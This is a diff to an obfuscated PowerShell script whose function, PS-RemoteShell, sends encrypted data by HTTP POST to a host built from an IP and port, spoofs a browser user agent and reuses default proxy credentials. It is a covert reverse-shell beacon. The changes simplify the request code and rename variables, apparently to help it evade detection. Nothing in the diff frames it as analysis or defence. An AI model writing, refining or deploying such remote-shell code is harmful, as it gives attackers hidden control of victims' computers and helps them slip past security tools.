@@ -115,31 +115,27 @@ function VAR55 {
 	PROCESS {
 		$VAR30 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
 		$VAR31 = ""
-		if(Get-Command Invoke-WebRequest -errorAction SilentlyContinue) {
-			$VAR31 = Invoke-WebRequest -Uri $Url -Method POST -Body $Data -UserAgent $VAR30 -TimeoutSec 10 -UseBasicParsing       
-		} else {
-			$VAR32 = [System.Net.WebRequest]::Create($Url)
-			$VAR32.Method = "POST"
-			$VAR32.UserAgent = $VAR30
-			$VAR32.Timeout = 10000
-			$VAR32.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-			try {
-				$VAR33 = $VAR32.GetRequestStream()
-				$VAR34 = New-Object System.IO.StreamWriter($VAR33)
-				$VAR34.Write($Data)
-			} finally {
-				if($null -ne $VAR34) { 
-					$VAR34.Dispose() 
-				}
-				if($null -ne $VAR33) {
-					$VAR33.Dispose() 
-				}
+		$VAR32 = [System.Net.WebRequest]::Create($Url)
+		$VAR32.Method = "POST"
+		$VAR32.UserAgent = $VAR30
+		$VAR32.Timeout = 10000
+		$VAR32.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+		try {
+			$VAR33 = $VAR32.GetRequestStream()
+			$VAR34 = New-Object System.IO.StreamWriter($VAR33)
+			$VAR34.Write($Data)
+		} finally {
+			if($null -ne $VAR34) { 
+				$VAR34.Dispose() 
 			}
-			$VAR35 = $VAR32.GetResponse().getResponseStream()
-			$VAR36 = New-Object System.IO.StreamReader($VAR35)
-			$VAR31 = $VAR36.ReadToEnd()
+			if($null -ne $VAR33) {
+				$VAR33.Dispose() 
+			}
 		}
-		$error.Clear()
+		$VAR35 = $VAR32.GetResponse().getResponseStream()
+		$VAR36 = New-Object System.IO.StreamReader($VAR35)
+		$VAR31 = $VAR36.ReadToEnd()
+
 		return $VAR31
 	}
 }
@@ -199,10 +195,10 @@ function PS-RemoteShell {
                     
             $VAR23 = ""
             Start-Sleep -m $Delay
-            $Url = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
+            $VAR37 = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
             $VAR21 = VAR54 -Buffer $VAR21 -Key $Key
             Try {
-                $VAR24 = VAR55 -Url $Url -Data $VAR21
+                $VAR24 = VAR55 -Url $VAR37 -Data $VAR21
                 $VAR23 = VAR53 -Buffer $VAR24 -Key $Key
             } Catch {
                 $VAR23 = ""
